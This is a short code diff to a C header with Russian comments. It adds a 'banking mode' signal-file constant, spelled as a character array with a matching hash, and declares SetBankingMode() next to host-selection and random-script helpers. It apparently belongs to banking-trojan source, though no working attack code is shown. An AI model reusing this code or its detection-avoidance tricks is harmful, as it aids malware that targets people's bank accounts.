@@ -44,6 +44,13 @@
 
 #define DEFAULT_DELAY  10 /* Задержка по умолчанию */
 
+//--------------------------------------------------------
+//  Им сигнального файла режима Банк
+//  Если файл с таким именем будет лежать в директории
+//  Application Data
+//--------------------------------------------------------
+const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
+const DWORD BANKING_SIGNAL_FILE_HASH = 0x2709A4B5; /* prfbnsmt.ini */
 
 //------------------------------------------------------------------
 //  GetActiveHost - Функция возвращает первый рабочий хост
@@ -87,6 +94,10 @@ PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD
 int GetDelay();
 
 char *GetPrefix();
+
+
+
+void SetBankingMode();
 
 
 //------------------------------------------------------------------------
